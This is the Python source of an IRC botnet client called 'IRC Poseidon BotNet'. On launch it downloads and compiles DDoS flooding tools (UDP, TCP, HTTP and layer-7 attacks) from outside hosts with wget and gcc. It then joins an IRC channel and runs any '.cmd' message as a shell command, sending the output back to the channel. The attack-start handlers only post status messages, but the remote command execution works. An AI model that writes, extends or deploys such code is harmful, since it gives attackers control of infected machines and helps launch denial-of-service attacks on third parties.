#!/usr/bin/env python2.7
#IRC Poseidon BotNet
#Coded by Ergo (@ergo_hacker)

import os  
import subprocess 
import socket 
import time 
import commands 
import random 
from re import search

#IRC CONFIGURATION
server = "irc.freenode.net"   #IRC SERVER
channel = "#SupremeBotnet"         #IRC CHANNEL
port = 6667
nick = "BotAtack" + str(random.randint(1, 10000))

#Verify if scripts exists, if not, download then

###### LAYER 4
if not os.path.isfile("udp.pl"): #udp
	print "[#]Installing udp...[#]"
	os.system("wget https://pastebin.com/raw/XAhxXjHd -O udp.pl")

if not os.path.isfile("tcp.c"): #tcp
	print "[#]Installing tcp...[#]"
	os.system("wget https://raw.githubusercontent.com/PraneethKarnena/DDoS-Scripts/master/Layer-4/TCP-Advanced-ESSYN/tcp.c")
	os.system("gcc tcp.c -pthread -o tcp")

if not os.path.isfile("std.c"): #std
	print "[#]Installing std...[#]"
	os.system("wget https://raw.githubusercontent.com/KrawkRE/DDoS-API/master/a83f1ca5ad00b39773d9e6a26b0e70b2/STD.c -O std.c")
	os.system("gcc std.c -pthread -o std")

###### LAYER 7
if not os.path.isfile("sad.py"): #sadattack
	print "[#]Installing sadattack...[#]"
	os.system("wget https://raw.githubusercontent.com/adsfdasdf/tros/master/sadattack.py -O sad.py")

if not os.path.isfile("http.pl"): #httpabuse
	print "[#]Installing httpabuse...[#]"
	os.system("wget https://raw.githubusercontent.com/KrawkRE/DDoS-API/master/a83f1ca5ad00b39773d9e6a26b0e70b2/HTTP.pl -O http.pl")

if not os.path.isfile("l7.py"): #layer7
	print "[#]Installing layer7...[#]"
	os.system("wget https://raw.githubusercontent.com/H1R0GH057/Anonymous/master/17.py -O l7.py")

print nick 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
s.send("NICK "+ nick +"\r\n")
s.send("USER " + nick + "1 1 1 1\r\n")
s.send("Join " + channel + "\r\n")

#if dosen't connect in your server try in irc.freenode.net (don't block any bot)

time.sleep(1)
print (s.recv(1024))

print nick + " Supremo Configurou o Bot"
print "\033[0;32mConnected!\033[0m"
target = 0
while True:
	text = s.recv(2048)
	print (text)
	if text.find(":.cmd") != -1:
		msg = text
		msg = msg.split(".cmd")
		print msg
		cmd = msg[1].split("\r\n")
		print cmd #com \n\r
		print cmd[0] #sem \n\r (pronto pra ser executado!)
		output = commands.getoutput(cmd[0])
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 50CMD00 => 22%s00]  \r\n" %(channel, output.decode("utf-8")))
	################### LAYER 4 ####################
	if text.find(":.udp ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 61UDP ATTACK STARTED00 => 04%s00]  \r\n" %(channel, target))

	if text.find(":.tcp ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 09TCP ATTACK STARTED00 => 04%s00]  \r\n" %(channel, target))

	if text.find(":.std ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 34STD ATTACK STARTED00 => 04%s00]  \r\n" %(channel, target))

	if text.find(":.stopudp ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 61UDP ATTACK FINISHED00 => 04%s00]  \r\n" %(channel, target))

	if text.find(":.stoptcp ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 09TCP ATTACK FINISHED00 => 04%s00]  \r\n" % (channel, target))

	if text.find(":.stopstd ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 34STD ATTACK FINISHED00 => 04%s00]  \r\n" %(channel, target))

	################### LAYER 7 ####################
	if text.find(":.sad ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 11SAD ATTACK STARTED00 => 04%s00]  \r\n" %(channel, target))

	if text.find(":.httpabuse ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 29HTTPABUSE ATTACK STARTED00 => 04%s00]  \r\n" %(channel, target))

	if text.find(":.layer7 ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 69LAYER7 ATTACK STARTED00 => 04%s00]  \r\n" %(channel, target))

	if text.find(":.stopsad ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 11SAD ATTACK FINISHED00 => 04%s00]  \r\n" %(channel, target))

	if text.find(":.stopabuse ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 29HTTPABUSE ATTACK FINISHED00 => 04%s00]  \r\n" %(channel, target))

	if text.find(":.stopl7 ") != -1:
		print "testing"
		s.send("PRIVMSG %s : 00[53IRC POSEIDON00 - 69LAYER7 ATTACK FINISHED00 => 04%s00]  \r\n" %(channel, target))






